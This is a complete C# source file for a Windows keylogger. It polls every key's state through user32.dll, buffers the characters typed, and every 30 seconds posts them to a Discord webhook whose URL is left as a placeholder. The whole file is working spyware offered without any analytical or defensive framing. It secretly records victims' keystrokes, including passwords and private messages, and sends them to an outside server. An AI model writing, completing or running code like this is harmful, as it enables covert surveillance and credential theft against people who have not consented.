using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class Program
{
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);

    static string webhookUrl = "WEBHOOK_URL_TO_HERE";
    static string buffer = "";
    static System.Diagnostics.Stopwatch timer = System.Diagnostics.Stopwatch.StartNew();

    static void SendDataToWebhook(string data)
    {
        try
        {
            using (System.Net.WebClient client = new System.Net.WebClient())
            {
                client.Headers.Add("Content-Type", "application/json");
                client.UploadString(webhookUrl, "POST", $"{{\"content\":\"{data}\"}}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error sending payload to Discord: {ex.Message}");
        }
    }

    static void StartKeyLogger()
    {
        while (true)
        {
            Thread.Sleep(1);

            for (int ascii = 9; ascii <= 254; ascii++)
            {
                short state = GetAsyncKeyState(ascii);

                if (state == -32767)
                {
                    byte[] kbstate = new byte[256];
                    GetKeyboardState(kbstate);

                    uint virtualKey = (uint)MapVirtualKey((uint)ascii, 3);

                    StringBuilder mychar = new StringBuilder();

                    int success = ToUnicode((uint)ascii, virtualKey, kbstate, mychar, mychar.Capacity, 0);

                    if (success != 0)
                    {
                        string key = mychar.ToString();

                        if (key == "{DELETE}")
                            key = "{BACKSPACE}";
                        else if (key == "{CTRL}")
                            key = "{CTRL}";
                        else if (key == "{V}")
                            key = "{CTRL+V}";
                        else if (key == "{C}")
                            key = "{CTRL+C}";

                        buffer += key;
                    }
                }
            }

            double elapsedMilliseconds = timer.Elapsed.TotalMilliseconds;

            if (elapsedMilliseconds >= 30000 && buffer.Length > 0)
            {
                string data = buffer;
                buffer = "";
                SendDataToWebhook(data);
                timer.Restart();
            }
        }
    }

    static void Main()
    {
        // Başlatma
        StartKeyLogger();
    }
}
